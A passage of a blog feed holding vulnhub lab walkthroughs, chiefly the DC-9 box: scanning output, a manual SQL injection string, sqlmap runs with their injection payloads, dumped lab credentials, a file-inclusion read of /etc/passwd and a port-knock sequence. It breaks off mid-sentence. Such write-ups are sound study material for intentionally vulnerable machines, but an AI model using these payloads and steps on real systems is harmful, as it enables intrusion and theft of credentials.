alt="image-20231113112706972"></p><h4 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h4><p>We can identify the system version of the target box as FREEBSD 9.0-RELEASE and we can easily find two poc using searchsploit.</p><p><img src="/2023/04/27/file-upload/image-20231113112718365.png" alt="image-20231113112718365"></p><p>I transfer the poc through nc because wget and some other commands are unavailable.</p><p><img src="/2023/04/27/file-upload/image-20231113112738209.png" alt="image-20231113112738209"></p><p>Compile and execute:</p><p><img src="/2023/04/27/file-upload/image-20231113112754343.png" alt="image-20231113112754343"></p><p>ROOT IT!</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_DC_9</title>
    <link href="/2024/07/23/vulnhub_DC_9/"/>
    <url>/2024/07/23/vulnhub_DC_9/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-DC-9"><a href="#vulnhub-DC-9" class="headerlink" title="vulnhub_DC_9"></a>vulnhub_DC_9</h1><p>In this article, I’m going to crack the DC-9 box of DC series in vulnhub.</p><p>portscan:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(root㉿kali)-[~/Desktop]<br>└─<span class="hljs-comment"># nmap -sC -sV 192.168.122.20 </span><br>Starting Nmap <span class="hljs-number">7.94</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2023</span><span class="hljs-number">-11</span><span class="hljs-number">-13</span> <span class="hljs-number">20</span>:<span class="hljs-number">41</span> EST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span><br>Host is up (<span class="hljs-number">0.00029</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE    SERVICE VERSION<br><span class="hljs-number">22</span>/tcp filtered ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>     <span class="hljs-keyword">http</span>    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.38</span> ((Debian))<br>|<span class="hljs-title">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.38</span> (Debian)<br>|<span class="hljs-title">_http-title</span>: Example.com - Staff Details - Welcome<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">04</span>:A2:<span class="hljs-number">19</span> (VMware)<br><br>Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">7.63</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure><p>It seems that only port 80 is open. Port 22 is filtered, let’s put it on hold for now.</p><p>When it comes to port 80, I will make an attempt to dirsearch and nikto subconsciously.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/Desktop]<br>└─# dirsearch -u http://192.168.122.20<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                  <br> (_||| _) (/_(_|| (_| )                                                                                                                                                                                           <br>                                                                                                                                                                                                                  <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.122.20/_23-11-13_20-48-30.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-11-13_20-48-30.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.122.20/<br><br>[20:48:30] Starting: <br>[20:48:32] 403 -  279B  - /.ht_wsr.txt                                     <br>[20:48:32] 403 -  279B  - /.htaccess.save                                  <br>[20:48:32] 403 -  279B  - /.htaccess.bak1<br>[20:48:32] 403 -  279B  - /.htaccess.sample<br>[20:48:32] 403 -  279B  - /.htaccess_sc<br>[20:48:32] 403 -  279B  - /.htaccess.orig<br>[20:48:32] 403 -  279B  - /.htaccess_orig<br>[20:48:32] 403 -  279B  - /.htaccess_extra<br>[20:48:32] 403 -  279B  - /.htaccessBAK<br>[20:48:32] 403 -  279B  - /.htaccessOLD                                    <br>[20:48:32] 403 -  279B  - /.htaccessOLD2<br>[20:48:32] 403 -  279B  - /.htm<br>[20:48:33] 403 -  279B  - /.html<br>[20:48:33] 403 -  279B  - /.htpasswd_test<br>[20:48:33] 403 -  279B  - /.httr-oauth                                     <br>[20:48:33] 403 -  279B  - /.htpasswds                                      <br>[20:48:34] 403 -  279B  - /.php                                            <br>[20:48:55] 200 -    0B  - /config.php                                       <br>[20:48:56] 301 -  314B  - /css  -&gt;  http://192.168.122.20/css/              <br>[20:48:58] 200 -    3KB - /display.php                                      <br>[20:49:04] 200 -  747B  - /includes/                                        <br>[20:49:04] 301 -  319B  - /includes  -&gt;  http://192.168.122.20/includes/    <br>[20:49:04] 200 -  917B  - /index.php                                        <br>[20:49:04] 200 -  917B  - /index.php/login/                                 <br>[20:49:08] 302 -    0B  - /logout.php  -&gt;  manage.php                       <br>[20:49:08] 200 -    1KB - /manage.php                                       <br>[20:49:20] 200 -    1KB - /search.php                                       <br>[20:49:20] 403 -  279B  - /server-status                                    <br>[20:49:20] 403 -  279B  - /server-status/                                   <br>┌──(root㉿kali)-[~]<br>└─# nikto -h 192.168.122.20   <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.122.20<br>+ Target Hostname:    192.168.122.20<br>+ Target Port:        80<br>+ Start Time:         2023-11-13 20:48:36 (GMT-5)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.38 (Debian)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.<br>+ /: Web Server returns a valid response with junk HTTP methods <span class="hljs-built_in">which</span> may cause <span class="hljs-literal">false</span> positives.<br>+ /config.php: PHP Config file may contain database IDs and passwords.<br>+ /css/: Directory indexing found.<br>+ /css/: This might be interesting.<br>+ /includes/: Directory indexing found.<br>+ /includes/: This might be interesting.<br>+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/<br>+ 8102 requests: 0 error(s) and 10 item(s) reported on remote host<br>+ End Time:           2023-11-13 20:49:08 (GMT-5) (32 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure><p>The size of the config.php page is 0B, where an arbitrary file read vulnerability may be needed to obtain certain configuration information.</p><p>Here are also some 200-code pages, let’s check them out using firefox.</p><p><img src="/2023/04/27/file-upload/image-20231114103757119.png" alt="image-20231114103757119"></p><p>Brute force, SQLI — failed.</p><p>Display.php shows all user information and search.php privodes a input form for specific seaerching.</p><p><img src="/2023/04/27/file-upload/image-20231114104151851.png" alt="image-20231114104151851"></p><p><img src="/2023/04/27/file-upload/image-20231114104712219.png" alt="image-20231114104712219"></p><p>It displayed correct result when I input mary, however when I tried <code>0&#39; or 1=1 #</code> it responsed with whole info!</p><p><img src="/2023/04/27/file-upload/image-20231114104840433.png" alt="image-20231114104840433"></p><p>SQLMAP GO!</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs inform7">┌──(root㉿kali)-<span class="hljs-comment">[~/Desktop/vulnhub/DC-9]</span><br>└─# sqlmap -r DC9 --random-agent --dbms=mysql -D Staff -T Users -C Username,Password --dump      <br>        ___<br>       __H__                                                                                                                                                                                                      <br> ___ ___<span class="hljs-comment">[&quot;]</span>_____ ___ ___  &#123;1.7.8#stable&#125;                                                                                                                                                                          <br>|_ -| . <span class="hljs-comment">[&#x27;]</span>     | .&#x27;| . |                                                                                                                                                                                         <br>|___|_  <span class="hljs-comment">[.]</span>_|_|_|__,|  _|                                                                                                                                                                                         <br>      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                      <br><br><span class="hljs-comment">[!]</span> legal disclaimer: Usage <span class="hljs-keyword">of</span> sqlmap for attacking targets without prior mutual consent <span class="hljs-keyword">is</span> illegal. It <span class="hljs-keyword">is</span> the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and <span class="hljs-keyword">are</span> not responsible for any misuse or damage caused by this program<br><br><span class="hljs-comment">[*]</span> starting @ 21:58:47 /2023-11-13/<br><br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> parsing HTTP request from &#x27;DC9&#x27;<br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> fetched random HTTP User-Agent header value &#x27;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-gb) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1&#x27; from file &#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;                                                                                                                                                                              <br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> testing connection to the target URL<br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> checking if the target <span class="hljs-keyword">is</span> protected by some <span class="hljs-keyword">kind</span> <span class="hljs-keyword">of</span> WAF/IPS<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing if the target URL content <span class="hljs-keyword">is</span> stable<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> target URL content <span class="hljs-keyword">is</span> stable<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing if POST parameter &#x27;search&#x27; <span class="hljs-keyword">is</span> dynamic<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[WARNING]</span> POST parameter &#x27;search&#x27; does not appear to be dynamic<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[WARNING]</span> heuristic (basic) test shows that POST parameter &#x27;search&#x27; might not be injectable<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing for SQL injection on POST parameter &#x27;search&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;Generic inline queries&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[WARNING]</span> time-based comparison requires larger statistical model, please wait............... (done)                                                                                                  <br><span class="hljs-comment">[21:59:08]</span> <span class="hljs-comment">[INFO]</span> POST parameter &#x27;search&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable <br>for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? <span class="hljs-comment">[Y/n]</span> y<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> automatically extending ranges for UNION query injection technique tests as there <span class="hljs-keyword">is</span> at least one other (potential) technique found<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> target URL appears to be UNION injectable with 6 columns<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> POST parameter &#x27;search&#x27; <span class="hljs-keyword">is</span> &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27; injectable<br>POST parameter &#x27;search&#x27; <span class="hljs-keyword">is</span> vulnerable. Do you want to keep testing the others (if any)? <span class="hljs-comment">[y/N]</span> y<br>sqlmap identified the following injection point(s) with a total <span class="hljs-keyword">of</span> 59 HTTP(s) requests:<br>---<br>Parameter: search (POST)<br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: search=1&#x27; AND (SELECT 9453 FROM (SELECT(SLEEP(5)))KFpZ) AND &#x27;pTLE&#x27;=&#x27;pTLE<br><br>    Type: UNION query<br>    Title: Generic UNION query (NULL) - 6 columns<br>    Payload: search=1&#x27; UNION ALL SELECT NULL,CONCAT(0x7170716271,0x50787558766b6c786b7663596d6f6b6f4d455975546751527162447053714a504b52776368594e6e,0x716a787171),NULL,NULL,NULL,NULL-- -<br>---<br><span class="hljs-comment">[21:59:19]</span> <span class="hljs-comment">[INFO]</span> the back-end DBMS <span class="hljs-keyword">is</span> MySQL<br>web server operating system: Linux Debian 10 (buster)<br>web application technology: Apache 2.4.38<br>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)<br><span class="hljs-comment">[21:59:19]</span> <span class="hljs-comment">[INFO]</span> fetching entries <span class="hljs-keyword">of</span> column(s) &#x27;Password,Username&#x27; for table &#x27;Users&#x27; in database &#x27;Staff&#x27;<br><span class="hljs-comment">[21:59:19]</span> <span class="hljs-comment">[INFO]</span> recognized possible password hashes in column &#x27;Password&#x27;<br>do you want to store hashes to a temporary file for eventual further processing with other tools <span class="hljs-comment">[y/N]</span> y<br><span class="hljs-comment">[21:59:21]</span> <span class="hljs-comment">[INFO]</span> writing hashes to a temporary file &#x27;/tmp/sqlmapnlg9g_9g406618/sqlmaphashes-__m2zybn.txt&#x27; <br>do you want to crack them via a dictionary-based attack? <span class="hljs-comment">[Y/n/q]</span> y<br><span class="hljs-comment">[21:59:21]</span> <span class="hljs-comment">[INFO]</span> using hash method &#x27;md5_generic_passwd&#x27;<br>what dictionary do you want to use?<br><span class="hljs-comment">[1]</span> default dictionary file &#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27; (press Enter)<br><span class="hljs-comment">[2]</span> custom dictionary file<br><span class="hljs-comment">[3]</span> file with list <span class="hljs-keyword">of</span> dictionary files<br>&gt; y<br><span class="hljs-comment">[21:59:22]</span> <span class="hljs-comment">[INFO]</span> using default dictionary<br>do you want to use common password suffixes? (slow!) <span class="hljs-comment">[y/N]</span> <br><span class="hljs-comment">[21:59:23]</span> <span class="hljs-comment">[INFO]</span> starting dictionary-based cracking (md5_generic_passwd)<br><span class="hljs-comment">[21:59:23]</span> <span class="hljs-comment">[INFO]</span> starting 4 processes <br><span class="hljs-comment">[21:59:39]</span> <span class="hljs-comment">[WARNING]</span> no clear password(s) found                                                                                                                                                                  <br>Database: Staff<br><span class="hljs-section">Table: Users</span><br><span class="hljs-comment">[1 entry]</span><br>+----------+----------------------------------+<br>| Username | Password                         |<br>+----------+----------------------------------+<br>| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |<br>+----------+----------------------------------+<br><br><span class="hljs-comment">[21:59:39]</span> <span class="hljs-comment">[INFO]</span> table &#x27;Staff.Users&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.122.20/dump/Staff/Users.csv&#x27;<br><span class="hljs-comment">[21:59:39]</span> <span class="hljs-comment">[INFO]</span> fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.122.20&#x27;<br><br><span class="hljs-comment">[*]</span> ending @ 21:59:39 /2023-11-13/<br></code></pre></td></tr></table></figure><p>856f5de590ef37314e7c3bdf6f8a66dc — md5 decrypt: transorbital1</p><p>Login using admin account:</p><p><img src="/2023/04/27/file-upload/image-20231114110420113.png" alt="image-20231114110420113"></p><p>“FILE DOES NOT EXIST” — It indicates that welcome.php page may have a param. </p><p>Maybe file? Let’s check it.</p><p><img src="/2023/04/27/file-upload/image-20231114111547238.png" alt="image-20231114111547238"></p><p>We can successfully access &#x2F;etc&#x2F;passwd through file param.</p><p>Do you remember that port 22 is filtered? It is possible that knock tool is utilized for port hidden.</p><p>Try to access knockd.conf file with vul mentioned above:</p><p><img src="/2023/04/27/file-upload/image-20231114112125136.png" alt="image-20231114112125136"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">──(root㉿kali)-[<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>wfuzz]<br>└─<span class="hljs-comment"># knock 192.168.122.20 7469:tcp 8475:tcp 9842:tcp</span><br>                                                                                                                                                                                                                  <br>┌──(root㉿kali)-[<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>wfuzz]<br>└─<span class="hljs-comment"># nmap -p 22 192.168.122.20 </span><br>Starting Nmap <span class="hljs-number">7.94</span> ( https:<span class="hljs-regexp">//</span>nmap.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">11</span>-<span class="hljs-number">13</span> <span class="hljs-number">22</span>:<span class="hljs-number">24</span> EST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">122.20</span><br>Host is up (<span class="hljs-number">0.0041</span>s latency).<br><br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">04</span>:A2:<span class="hljs-number">19</span> (VMware)<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.82</span> seconds<br></code></pre></td></tr></table></figure><p>Well, it worked.</p><p>Now we can access SSH service, however there’s nothing useful about valid accounts XD.</p><p>Let’s move back to sqlmap and check User database.</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">┌──(root㉿kali)-[/usr/share/wordlists/wfuzz]<br>└─<span class="hljs-comment"># sqlmap -r /root/Desktop/vulnhub/DC-9/DC9 --random-agent --dbms=mysql -D users -T UserDetails -C username,password --dump</span><br>        ___<br>       __H__                                                                                                                                                                                                      <br> ___ ___[)]_____ ___ ___  &#123;1.7.8<span class="hljs-comment">#stable&#125;                                                                                                                                                                          </span><br>|<span class="hljs-string">_ -</span>|<span class="hljs-string"> . [&quot;]     </span>|<span class="hljs-string"> .&#x27;</span>|<span class="hljs-string"> . </span>|<span class="hljs-string">                                                                                                                                                                                         </span><br><span class="hljs-string"></span>|<span class="hljs-string">___</span>|<span class="hljs-string">_  [&quot;]_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">__,</span>|<span class="hljs-string">  _</span>|<span class="hljs-string">                                                                                                                                                                                         </span><br><span class="hljs-string">      </span>|<span class="hljs-string">_</span>|<span class="hljs-string">V...       </span>|<span class="hljs-string">_</span>|<span class="hljs-string">   https://sqlmap.org                                                                                                                                                                      </span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] starting @ 22:27:02 /2023-11-13/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[22:27:02] [INFO] parsing HTTP request from &#x27;/root/Desktop/vulnhub/DC-9/DC9&#x27;</span><br><span class="hljs-string">[22:27:02] [INFO] fetched random HTTP User-Agent header value &#x27;Opera/9.61 (X11; Linux i686; U; ru) Presto/2.1.1&#x27; from file &#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;</span><br><span class="hljs-string">[22:27:02] [INFO] testing connection to the target URL</span><br><span class="hljs-string">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="hljs-string">---</span><br><span class="hljs-string">Parameter: search (POST)</span><br><span class="hljs-string">    Type: time-based blind</span><br><span class="hljs-string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="hljs-string">    Payload: search=1&#x27; AND (SELECT 9453 FROM (SELECT(SLEEP(5)))KFpZ) AND &#x27;pTLE&#x27;=&#x27;pTLE</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: UNION query</span><br><span class="hljs-string">    Title: Generic UNION query (NULL) - 6 columns</span><br><span class="hljs-string">    Payload: search=1&#x27; UNION ALL SELECT NULL,CONCAT(0x7170716271,0x50787558766b6c786b7663596d6f6b6f4d455975546751527162447053714a504b52776368594e6e,0x716a787171),NULL,NULL,NULL,NULL-- -</span><br><span class="hljs-string">---</span><br><span class="hljs-string">[22:27:02] [INFO] testing MySQL</span><br><span class="hljs-string">[22:27:02] [INFO] confirming MySQL</span><br><span class="hljs-string">[22:27:02] [INFO] the back-end DBMS is MySQL</span><br><span class="hljs-string">web server operating system: Linux Debian 10 (buster)</span><br><span class="hljs-string">web application technology: Apache 2.4.38</span><br><span class="hljs-string">back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)</span><br><span class="hljs-string">[22:27:02] [INFO] fetching entries of column(s) &#x27;password,username&#x27; for table &#x27;UserDetails&#x27; in database &#x27;users&#x27;</span><br><span class="hljs-string">Database: users</span><br><span class="hljs-string">Table: UserDetails</span><br><span class="hljs-string">[17 entries]</span><br><span class="hljs-string">+-----------+---------------+</span><br><span class="hljs-string"></span>|<span class="hljs-string"> username  </span>|<span class="hljs-string"> password      </span>|<br>+-----------+---------------+<br>|<span class="hljs-string"> marym     </span>|<span class="hljs-string"> 3kfs86sfd     </span>|<br>|<span class="hljs-string"> julied    </span>|<span class="hljs-string"> 468sfdfsd2    </span>|<br>|<span class="hljs-string"> fredf     </span>|<span class="hljs-string"> 4sfd87sfd1    </span>|<br>|<span class="hljs-string"> barneyr   </span>|<span class="hljs-string"> RocksOff      </span>|<br>|<span class="hljs-string"> tomc      </span>|<span class="hljs-string"> TC&amp;TheBoyz    </span>|<br>|<span class="hljs-string"> jerrym    </span>|<span class="hljs-string"> B8m#48sd      </span>|<br>|<span class="hljs-string"> wilmaf    </span>|<span class="hljs-string"> Pebbles       </span>|<br>|<span class="hljs-string"> bettyr    </span>|<span class="hljs-string"> BamBam01      </span>|<br>|<span class="hljs-string"> chandlerb </span>|<span class="hljs-string"> UrAG0D!       </span>|<br>|<span class="hljs-string"> joeyt     </span>|<span class="hljs-string"> Passw0rd      </span>|<br>|<span class="hljs-string"> rachelg   </span>|<span class="hljs-string"> yN72#dsd      </span>|<br>|<span class="hljs-string"> rossg     </span>|<span class="hljs-string"> ILoveRachel   </span>|<br>|<span class="hljs-string"> monicag   </span>|<span class="hljs-string"> 3248dsds7s    </span>|<br>|<span class="hljs-string"> phoebeb   </span>|<span class="hljs-string"> smellycats    </span>|<br>|<span class="hljs-string"> scoots    </span>|<span class="hljs-string"> YR3BVxxxw87   </span>|<br>|<span class="hljs-string"> janitor   </span>|<span class="hljs-string"> Ilovepeepee   </span>|<br>|<span class="hljs-string"> janitor2  </span>|<span class="hljs-string"> Hawaii-Five-0 </span>|<br>+-----------+---------------+<br><br>[22:27:02] [INFO] table &#x27;users.UserDetails&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.122.20/dump/users/UserDetails.csv&#x27;<br>[22:27:02] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.122.20&#x27;<br><br>[<span class="hljs-symbol">*</span>] ending @ 22:27:02 /2023-11-13/<br></code></pre></td></tr></table></figure><p>I utilized cut command to organize the data from the database into “user” and “pass” files for 